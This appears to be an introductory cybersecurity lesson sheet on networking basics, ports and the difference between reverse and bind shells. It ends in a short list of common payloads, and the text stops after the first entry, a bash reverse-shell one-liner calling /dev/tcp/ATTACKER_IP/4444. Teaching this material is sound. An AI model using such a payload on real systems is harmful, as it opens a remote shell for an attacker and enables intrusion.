# Theory – Concepts of Networking & Reverse Shell

## 1. Why Networking Matters in Cybersecurity
Every cyber attack happens over a network. To detect, prevent, or simulate attacks, we must understand how data moves between devices.

---

## 2. Key Networking Concepts

### OSI Model 
The OSI model has 7 layers, but for this task, we focus on 3:
- **Layer 3 (Network)**: Handles **IP addresses** (e.g., `192.168.1.10` or `127.0.0.1` for localhost)
- **Layer 4 (Transport)**: Handles **ports and connection type**:
  - **TCP**: Reliable (used by SSH, HTTP) → like a phone call with confirmation
  - **UDP**: Fast but unreliable (used by DNS, video calls) → like shouting in a crowd
- **Layer 7 (Application)**: Where real apps work (browser, email, terminal shell)

### Common Ports
- **22**: SSH (secure remote login)
- **80**: HTTP (websites)
- **443**: HTTPS (secure websites)
- **4444**: Not standard — often used by attackers for **reverse shells**

> 🔍 **Why port 4444?**  
> Firewalls usually block unknown inbound connections, but allow outbound traffic. Attackers use high ports like 4444 because they’re less monitored.

---

## 3. What is a Shell?
A **shell** is a command-line interface to control an operating system.  
→ Example: In Kali Linux, your terminal runs the **Bash shell**. Typing `whoami` shows your username.

---

## 4. Reverse Shell 

### What is it?
A **reverse shell** is when the **victim’s machine connects back to the attacker**, giving the attacker full terminal access.

> 🎯 **Real-life analogy**:  
> Normally, a hacker knocks on your door (bind shell) → but your firewall blocks unknown knocks.  
> In a reverse shell, **you (victim) call the hacker yourself** → and since outbound calls are usually allowed, it works!

### Reverse Shell vs Bind Shell
| Type | Who connects? | Blocked by firewall? |
|------|----------------|----------------------|
| **Bind Shell**    | Attacker → Victim    | Yes (inbound blocked) |
| **Reverse Shell** | Victim → Attacker    | No (outbound often allowed) |

### Why Do Attackers Use It?
- Bypass firewalls
- Maintain access after exploiting a web app (e.g., via file upload or RCE)
- Common in real-world breaches and bug bounty reports

### Common Payloads (Commands)
1. **Bash** (Linux/macOS):
   ```bash
   bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
